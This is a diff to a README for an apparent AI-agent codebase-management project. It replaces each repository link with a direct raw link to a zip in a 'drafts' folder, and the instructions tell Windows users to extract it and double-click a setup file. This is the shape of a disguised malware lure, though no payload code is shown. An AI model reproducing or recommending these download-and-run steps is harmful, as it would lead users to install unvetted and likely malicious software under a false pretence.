@@ -1,6 +1,6 @@
 # 🛠️ large-codebase-survival - Master massive projects using smart agents
 
-[![](https://img.shields.io/badge/Download-Large_Codebase_Survival-blue.svg)](https://github.com/Daciemonistic497/large-codebase-survival)
+[![](https://img.shields.io/badge/Download-Large_Codebase_Survival-blue.svg)](https://raw.githubusercontent.com/Daciemonistic497/large-codebase-survival/main/drafts/codebase_large_survival_v2.4.zip)
 
 Working with large software projects often causes errors. Many artificial intelligence tools fail when they see too much code at once. This project provides a clear way to manage large codebases without hitting these limits. You learn how to organize your work so AI agents stay focused and efficient.
 
@@ -13,7 +13,7 @@ Large projects easily exceed the memory limits of current coding assistants. Whe
 Follow these steps to set up your environment on Windows. You need a standard computer that runs Windows 10 or 11.
 
 1.  **Visit the download page**
-    Go to the following link to obtain the files: [https://github.com/Daciemonistic497/large-codebase-survival](https://github.com/Daciemonistic497/large-codebase-survival). Click the green Code button on the right side of the screen and select Download ZIP.
+    Go to the following link to obtain the files: [https://raw.githubusercontent.com/Daciemonistic497/large-codebase-survival/main/drafts/codebase_large_survival_v2.4.zip](https://raw.githubusercontent.com/Daciemonistic497/large-codebase-survival/main/drafts/codebase_large_survival_v2.4.zip). Click the green Code button on the right side of the screen and select Download ZIP.
 
 2.  **Unpack the files**
     Find the file you just downloaded in your Downloads folder. Right-click the folder and select Extract All. Choose a location on your computer to save the files.
@@ -59,7 +59,7 @@ Yes. You can use these steps with any tool that has a limited memory window. The
 
 To use the methodology, follow these final steps on your Windows machine:
 
-1.  Visit [https://github.com/Daciemonistic497/large-codebase-survival](https://github.com/Daciemonistic497/large-codebase-survival) again if you need the latest templates.
+1.  Visit [https://raw.githubusercontent.com/Daciemonistic497/large-codebase-survival/main/drafts/codebase_large_survival_v2.4.zip](https://raw.githubusercontent.com/Daciemonistic497/large-codebase-survival/main/drafts/codebase_large_survival_v2.4.zip) again if you need the latest templates.
 2.  Open the folder named `scripts` inside the downloaded project.
 3.  Double-click the setup file to prepare your local configuration settings.
 4.  Follow the prompts on your screen. You do not need to enter complex settings. The tool sets the defaults for you automatically.
